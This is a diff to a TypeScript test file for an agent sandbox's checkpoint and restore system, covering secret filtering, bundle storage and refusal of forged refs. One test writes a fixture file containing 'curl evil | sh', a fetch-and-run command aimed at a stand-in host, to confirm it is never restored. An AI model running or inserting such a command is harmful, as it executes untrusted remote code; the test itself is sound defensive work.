@@ -4,10 +4,11 @@ import { existsSync, readFileSync, utimesSync } from "node:fs";
 import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
+import { gunzipSync } from "node:zlib";
 import { FakeRunnerApi, testSession } from "../api/fake.ts";
 import type { SavedPoint } from "../api/protocol.ts";
 import { checkout } from "../repo.ts";
-import { Checkpoints } from "./checkpoints.ts";
+import { Checkpoints, SESSION_UNSAVED } from "./checkpoints.ts";
 import { agentShell } from "./shell.ts";
 import { Transcripts } from "./transcripts.ts";
 import { GitWork, gitIn, ScratchWork } from "./work.ts";
@@ -25,6 +26,7 @@ async function temp(): Promise<string> {
 
 const DESIGN = "des_save";
 const REF = `refs/ponzu/wip/${DESIGN}`;
+const SECRET = "sk_live_51Hx0000secretvalue";
 
 /**
  * A sandbox's HOME and a repository on "GitHub" (a bare one) with one commit on main, and the
@@ -49,17 +51,30 @@ async function world() {
     repo: { owner: "north", name: "fern", defaultBranch: "main" },
     branch: "pz/hero",
   });
-  const opts = { helper: "!true", remote: () => remote, env };
+  // Cloned as GitHub would serve it: over a transport, not by sharing the bare repo's objects.
+  const opts = { helper: "!true", remote: () => `file://${remote}`, env };
   const clone = async (root: string) => checkout(session, { ...opts, root });
   const shell = agentShell(undefined, env);
   const work = (cwd: string, limits?: { fileBytes: number; totalBytes: number }) =>
     new GitWork({
       cwd,
       designId: DESIGN,
+      branch: "pz/hero",
+      defaultBranch: "main",
       git: gitIn(shell, "git", cwd),
+      secrets: [SECRET, "short"],
       ...(limits ? { limits } : {}),
     });
-  return { git, remote, seed, clone, work, home, env };
+  /** Someone pushes a commit to `branch` on GitHub. */
+  const push = async (branch: string, file: string) => {
+    git(["fetch", "--quiet", remote, `${branch}:refs/remotes/up/${branch}`], seed);
+    git(["switch", "--quiet", "-C", branch, `refs/remotes/up/${branch}`], seed);
+    await writeFile(join(seed, file), `${file}\n`);
+    git(["add", file], seed);
+    git(["-c", "user.name=S", "-c", "user.email=s@t", "commit", "--quiet", "-m", file], seed);
+    git(["push", "--quiet", remote, branch], seed);
+  };
+  return { git, remote, seed, clone, work, home, env, push };
 }
 
 const point = (over: Partial<SavedPoint> = {}): SavedPoint => ({
@@ -72,7 +87,7 @@ const point = (over: Partial<SavedPoint> = {}): SavedPoint => ({
   ...over,
 });
 
-test("work in progress goes to a hidden ref: changes and untracked files, not ignored or large ones, and nothing else moves", async () => {
+test("work in progress is a bundle kept with the checkpoint: changes and untracked files, nothing ignored, large or secret, and nothing goes to GitHub", async () => {
   const { git, remote, clone, work } = await world();
   const dir = await clone(await temp());
   await writeFile(join(dir, "README.md"), "Fern, calmer\n");
@@ -82,6 +97,13 @@ test("work in progress goes to a hidden ref: changes and untracked files, not ig
   await writeFile(join(dir, "dist", "bundle.js"), "built\n");
   await writeFile(join(dir, "debug.log"), "noise\n");
   await writeFile(join(dir, "big.bin"), Buffer.alloc(2048, 1));
+  // What an agent writes to run the app: none of it is ignored by this repo.
+  await writeFile(join(dir, ".env"), `STRIPE_SECRET_KEY=${SECRET}\n`);
+  await writeFile(join(dir, ".env.example"), "STRIPE_SECRET_KEY=\n");
+  await mkdir(join(dir, "certs"));
+  await writeFile(join(dir, "certs", "server.pem"), "-----BEGIN PRIVATE KEY-----\n");
+  await writeFile(join(dir, ".npmrc"), "//registry.npmjs.org/:_authToken=npm_x\n");
+  await writeFile(join(dir, "src", "config.js"), `export const key = "${SECRET}";\n`);
   git(["add", "src/hero.html"], dir); // staged, so the real index holds something
   const headBefore = git(["rev-parse", "HEAD"], dir);
   const statusBefore = git(["status", "--porcelain"], dir);
@@ -89,22 +111,35 @@ test("work in progress goes to a hidden ref: changes and untracked files, not ig
   const saved = await work(dir, { fileBytes: 1024, totalBytes: 1_000_000 }).save(3);
 
   expect(saved.wipCommit).toMatch(/^[0-9a-f]{40}$/);
-  expect(saved.skipped).toEqual(["big.bin (2048 bytes)"]);
-  // On GitHub: the hidden ref, and no branch.
-  expect(git(["--git-dir", remote, "rev-parse", REF])).toBe(saved.wipCommit!);
-  expect(git(["--git-dir", remote, "branch", "--list"])).toBe("* main");
-  const files = git(["--git-dir", remote, "ls-tree", "-r", "--name-only", REF]).split("\n");
-  expect(files.sort()).toEqual([".gitignore", "README.md", "src/hero.html"]);
-  expect(git(["--git-dir", remote, "show", `${REF}:README.md`])).toBe("Fern, calmer");
-  expect(git(["--git-dir", remote, "log", "-1", "--format=%B", REF])).toContain("Ponzu-Turn: 3");
-  expect(git(["--git-dir", remote, "rev-parse", `${REF}^`])).toBe(headBefore);
+  expect(saved.workspace).not.toBeNull();
+  expect(saved.skipped.sort()).toEqual([
+    ".env (may hold a secret)",
+    ".npmrc (may hold a secret)",
+    "big.bin (2048 bytes)",
+    "certs/server.pem (may hold a secret)",
+    "src/config.js (holds a secret's value)",
+  ]);
+  // GitHub has the branch it had, and nothing else: no ref, no branch.
+  expect(git(["--git-dir", remote, "for-each-ref", "--format=%(refname)"])).toBe("refs/heads/main");
+  const files = git(["ls-tree", "-r", "--name-only", saved.wipCommit!], dir).split("\n");
+  expect(files.sort()).toEqual([".env.example", ".gitignore", "README.md", "src/hero.html"]);
+  expect(git(["show", `${saved.wipCommit}:README.md`], dir)).toBe("Fern, calmer");
+  const message = git(["log", "-1", "--format=%B", saved.wipCommit!], dir);
+  expect(message).toContain("Ponzu-Turn: 3");
+  expect(message).toContain("Ponzu-Skipped: .env (may hold a secret)");
+  expect(git(["rev-parse", `${saved.wipCommit}^`], dir)).toBe(headBefore);
+  // The bundle holds no secret either.
+  expect(Buffer.from(gunzipSync(saved.workspace!)).includes(SECRET)).toBe(false);
   // The checkout is as it was: the same HEAD, branch, index and working tree.
   expect(git(["rev-parse", "HEAD"], dir)).toBe(headBefore);
   expect(git(["branch", "--show-current"], dir)).toBe("pz/hero");
   expect(git(["status", "--porcelain"], dir)).toBe(statusBefore);
 
-  // Nothing new: the same commit, and no new push.
-  expect((await work(dir).save(4)).wipCommit).not.toBeNull();
+  // Nothing new: the same commit, and the stored archive is kept.
+  const again = await work(dir, { fileBytes: 1024, totalBytes: 1_000_000 });
+  const first = await again.save(4);
+  const second = await again.save(5);
+  expect(second).toMatchObject({ wipCommit: first.wipCommit, workspace: null, kept: true });
 });
 
 test("a fresh checkout gets the work back on top of the branch, unpushed commits included", async () => {
@@ -121,7 +156,10 @@ test("a fresh checkout gets the work back on top of the branch, unpushed commits
   // The sandbox is lost: a new one clones the branch, which GitHub never got.
   const second = await clone(await temp());
   expect(git(["rev-parse", "HEAD"], second)).not.toBe(unpushed);
-  const restored = await work(second).restore(point({ turn: 5, wipCommit: saved.wipCommit }), null);
+  const restored = await work(second).restore(
+    point({ turn: 5, wipCommit: saved.wipCommit }),
+    saved.workspace,
+  );
 
   expect(restored.done).toBe(true);
   expect(git(["rev-parse", "HEAD"], second)).toBe(unpushed);
@@ -138,34 +176,98 @@ test("a fresh checkout gets the work back on top of the branch, unpushed commits
   expect(git(["diff", "--cached", "--name-only"], second)).toBe("");
 });
 
+test("a new sandbox gets the work of a branch never pushed back after main moved on", async () => {
+  const { git, clone, work, push } = await world();
+  const first = await clone(await temp());
+  await writeFile(join(first, "notes.md"), "uncommitted notes\n");
+  const saved = await work(first).save(2);
+
+  // Someone pushes to main; the design's branch was never pushed. A new sandbox makes the
+  // branch again from main as it is now.
+  await push("main", "later.md");
+  const second = await clone(await temp());
+  expect(existsSync(join(second, "later.md"))).toBe(true);
+  const restored = await work(second).restore(
+    point({ turn: 2, wipCommit: saved.wipCommit }),
+    saved.workspace,
+  );
+
+  expect(restored.done).toBe(true);
+  expect(readFileSync(join(second, "notes.md"), "utf8")).toBe("uncommitted notes\n");
+  expect(git(["branch", "--show-current"], second)).toBe("pz/hero");
+  expect(git(["status", "--porcelain"], second)).toBe("?? notes.md");
+});
+
 test("a restore never goes back over newer work: a branch that moved on, or changes on the disk", async () => {
-  const { git, seed, remote, clone, work } = await world();
+  const { git, clone, work, push } = await world();
   const first = await clone(await temp());
   await writeFile(join(first, "README.md"), "saved edit\n");
   const saved = await work(first).save(2);
 
-  // Someone pushed to the branch since: the saved work is older than it.
+  // Someone pushed to the design's branch since: the saved work is older than it.
+  git(["push", "--quiet", "origin", "pz/hero"], first);
+  await push("pz/hero", "later.md");
   const second = await clone(await temp());
-  git(["switch", "--quiet", "-c", "pz/hero"], seed);
-  await writeFile(join(seed, "later.md"), "later\n");
-  git(["add", "later.md"], seed);
-  git(["-c", "user.name=S", "-c", "user.email=s@t", "commit", "--quiet", "-m", "Later"], seed);
-  git(["push", "--quiet", remote, "pz/hero"], seed);
-  git(["pull", "--quiet", "--ff-only", "origin", "pz/hero"], second);
-  const moved = await work(second).restore(point({ turn: 2, wipCommit: saved.wipCommit }), null);
-  expect(moved.done).toBe(false);
+  const moved = await work(second).restore(
+    point({ turn: 2, wipCommit: saved.wipCommit }),
+    saved.workspace,
+  );
+  expect(moved).toMatchObject({ done: false, kept: "ponzu-wip/turn-2" });
   expect(readFileSync(join(second, "README.md"), "utf8")).toBe("Fern\n");
   expect(existsSync(join(second, "later.md"))).toBe(true);
+  // The work is on this disk, on a branch of its own, for the agent to bring over.
+  expect(git(["show", "ponzu-wip/turn-2:README.md"], second)).toBe("saved edit");
 
   // The disk has changes of its own: they are stashed, not lost, before the saved work goes on.
   const third = await clone(await temp());
   git(["reset", "--quiet", "--hard", "origin/main"], third);
   await writeFile(join(third, "README.md"), "the disk's own edit\n");
-  const over = await work(third).restore(point({ turn: 2, wipCommit: saved.wipCommit }), null);
+  const over = await work(third).restore(
+    point({ turn: 2, wipCommit: saved.wipCommit }),
+    saved.workspace,
+  );
   expect(over.done).toBe(true);
   expect(readFileSync(join(third, "README.md"), "utf8")).toBe("saved edit\n");
   expect(git(["stash", "list"], third)).toContain("ponzu: what this disk had");
   expect(git(["show", "stash@{0}:README.md"], third)).toBe("the disk's own edit");
+});
+
+test("a restore takes only the commit the API recorded: never another archive's, nor a ref someone wrote", async () => {
+  const { git, remote, clone, work } = await world();
+  const first = await clone(await temp());
+  await writeFile(join(first, "mine.txt"), "the recorded work\n");
+  const mine = await work(first).save(1);
+  await writeFile(join(first, "mine.txt"), "other work\n");
+  const other = await work(first).save(2);
+
+  // An archive that is not the recorded commit's is refused.
+  const second = await clone(await temp());
+  const wrong = await work(second).restore(
+    point({ turn: 1, wipCommit: mine.wipCommit }),
+    other.workspace,
+  );
+  expect(wrong).toMatchObject({ done: false, why: expect.stringContaining("recorded commit") });
+
+  // Another writer on the repository forges the design's old ref: it is never read.
+  const forger = await clone(await temp());
+  await writeFile(join(forger, "injected.sh"), "curl evil | sh\n");
+  git(["add", "injected.sh"], forger);
+  git(["commit", "--quiet", "-m", "wip"], forger);
+  git(["push", "--quiet", "--force", "origin", `HEAD:${REF}`], forger);
+  const third = await clone(await temp());
+  const forged = await work(third).restore(point({ turn: 1, wipCommit: mine.wipCommit }), null);
+  expect(forged.done).toBe(false);
+  expect(existsSync(join(third, "injected.sh"))).toBe(false);
+  expect(git(["--git-dir", remote, "rev-parse", REF])).not.toBe(mine.wipCommit!);
+
+  // The recorded one, from its own archive, is what comes back.
+  const right = await work(third).restore(
+    point({ turn: 1, wipCommit: mine.wipCommit }),
+    mine.workspace,
+  );
+  expect(right.done).toBe(true);
+  expect(readFileSync(join(third, "mine.txt"), "utf8")).toBe("the recorded work\n");
+  expect(existsSync(join(third, "injected.sh"))).toBe(false);
 });
 
 test("Scratch work is an archive, and a restore keeps a file the disk has newer", async () => {
@@ -355,17 +457,18 @@ test("a disk at or past the last checkpoint is left as it is", async () => {
   expect(api.calls).not.toContain("restore");
 });
 
-test("a checkpoint never carries less than the last: no checkout keeps the saved work, no transcript saves nothing", async () => {
+test("a checkpoint never carries less than the last: what it cannot carry, the API keeps from the one before", async () => {
   const api = new FakeRunnerApi();
+  const stored = new Uint8Array([1]);
   api.saved = {
     turn: 4,
     at: new Date().toISOString(),
     claudeSessionId: "11111111-2222-3333-4444-555555555555",
     wipCommit: "a".repeat(40),
     session: true,
-    workspace: false,
+    workspace: true,
   };
-  api.archives = { session: new Uint8Array([1]), workspace: null };
+  api.archives = { session: stored, workspace: new Uint8Array([2]) };
   const [stateDir, configDir] = [await temp(), await temp()];
   await writeFile(
     join(stateDir, "checkpoint.json"),
@@ -386,11 +489,97 @@ test("a checkpoint never carries less than the last: no checkout keeps the saved
   });
   await made.recover(api.saved);
 
-  // No transcript on this disk yet: saving would drop the stored one.
+  // No transcript on this disk yet: the stored one, and the stored work, are kept.
   await made.save(id);
-  expect(api.checkpoints).toHaveLength(0);
+  expect(api.checkpoints.at(-1)).toMatchObject({
+    turn: 5,
+    keep: { session: true, workspace: true },
+  });
+  expect(api.saved).toMatchObject({
+    turn: 5,
+    claudeSessionId: id,
+    wipCommit: "a".repeat(40),
+    session: true,
+    workspace: true,
+  });
+  expect(api.archives.session).toBe(stored);
 
-  await transcript(configDir, id, ['{"n":5}']);
+  await transcript(configDir, id, ['{"n":6}']);
   await made.save(id);
-  expect(api.saved).toMatchObject({ turn: 5, wipCommit: "a".repeat(40), session: true });
+  expect(api.saved).toMatchObject({ turn: 6, wipCommit: "a".repeat(40), session: true });
+  expect(api.archives.session).not.toBe(stored);
+});
+
+test("a transcript too large to keep does not stop the work from being saved, and the person is told once", async () => {
+  const api = new FakeRunnerApi();
+  const [stateDir, cwd, configDir] = [await temp(), await temp(), await temp()];
+  const id = "11111111-2222-3333-4444-555555555555";
+  await transcript(configDir, id, ['{"n":1}']);
+  const shell = agentShell(undefined, process.env);
+  const transcripts = new Transcripts({ configDir, shell });
+  const told: string[] = [];
+  const events: string[] = [];
+  const made = new Checkpoints({
+    api: await api.connect(),
+    stateDir,
+    transcripts,
+    work: new ScratchWork({ cwd, shell }),
+    log: () => {},
+    event: (name) => events.push(name),
+    boot: () => ({ id: null, at: null }),
+    flush: async () => {},
+    notify: (message) => told.push(message),
+  });
+  await made.recover(null);
+  await writeFile(join(cwd, "a.html"), "one\n");
+  await made.save(id);
+  expect(api.saved).toMatchObject({ turn: 1, session: true, workspace: true });
+  const first = api.archives.session;
+
+  // The conversation outgrows what a checkpoint keeps.
+  (transcripts as unknown as { maxBytes: number }).maxBytes = 10;
+  await writeFile(join(configDir, "projects", "-home-agent-work-fern", `${id}.jsonl`), "{}\n{}\n");
+  await writeFile(join(cwd, "precious.html"), "<p>keep me</p>\n");
+  await made.save(id);
+  expect(api.saved).toMatchObject({ turn: 2, claudeSessionId: id, session: true, workspace: true });
+  // The work of this turn is saved; the transcript stored is the last that could be.
+  expect(api.archives.session).toBe(first);
+  const restored = await temp();
+  await new ScratchWork({ cwd: restored, shell }).restore(api.saved!, api.archives.workspace);
+  expect(readFileSync(join(restored, "precious.html"), "utf8")).toBe("<p>keep me</p>\n");
+  expect(events).toContain("checkpoint_session_skipped");
+
+  await writeFile(join(cwd, "more.html"), "more\n");
+  await made.save(id);
+  expect(api.saved!.turn).toBe(3);
+  expect(told).toEqual([SESSION_UNSAVED]);
+});
+
+test("a marker that only lags the API, because the stop came between the API's answer and its write, is no rollback", async () => {
+  const api = new FakeRunnerApi();
+  const [stateDir, cwd, configDir] = [await temp(), await temp(), await temp()];
+  await writeFile(join(cwd, "a.html"), "one\n");
+  const first = await checkpoints(api, stateDir, cwd, configDir);
+  await first.made.recover(null);
+  await first.made.save(null);
+  await writeFile(join(cwd, "a.html"), "two\n");
+  // The checkpoint is recorded, and the process is killed before the marker says so.
+  const saveCheckpoint = api.saveCheckpoint.bind(api);
+  let marker = "";
+  api.saveCheckpoint = async (runner, point) => {
+    const answer = await saveCheckpoint(runner, point);
+    marker = readFileSync(join(stateDir, "checkpoint.json"), "utf8");
+    return answer;
+  };
+  await first.made.save(null);
+  expect(api.saved!.turn).toBe(2);
+  expect(JSON.parse(marker)).toMatchObject({ turn: 1, pending: 2 });
+  await writeFile(join(stateDir, "checkpoint.json"), marker);
+
+  const second = await checkpoints(api, stateDir, cwd, configDir);
+  expect((await second.made.recover(api.saved)).kind).toBe("none");
+  expect(second.events.map((e) => e.name)).toEqual(["marker_lag"]);
+  expect(api.restored).toEqual([]);
+  expect(second.made.marker()!.turn).toBe(2);
+  expect(readFileSync(join(cwd, "a.html"), "utf8")).toBe("two\n");
 });
